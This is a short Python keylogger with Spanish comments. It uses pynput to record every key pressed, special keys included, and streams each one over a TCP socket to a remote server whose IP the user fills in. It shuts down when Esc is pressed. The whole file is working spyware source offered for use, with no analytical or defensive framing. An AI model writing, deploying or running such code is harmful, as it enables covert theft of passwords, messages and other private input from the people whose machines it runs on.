from pynput.keyboard import Listener, Key
import socket

# Configurar el cliente para enviar las teclas al servidor en la máquina host
host_ip = "0.0.0.0"   # Reemplaza con la IP de tu máquina host
host_port = 5000

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((host_ip, host_port))

def on_press(key):
    try:
        # Enviar la tecla presionada al servidor
        client_socket.send(f"Tecla presionada: {key.char}\n".encode())
    except AttributeError:
        # Enviar teclas especiales (como Enter, Shift, etc.)
        client_socket.send(f"Tecla especial presionada: {key}\n".encode())

def on_release(key):
    if key == Key.esc:
        # Cerrar la conexión cuando se presione 'Esc'
        client_socket.send(f"Keylogger detenido.\n".encode())
        client_socket.close()
        return False

# Escuchar las teclas presionadas y enviarlas al servidor
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
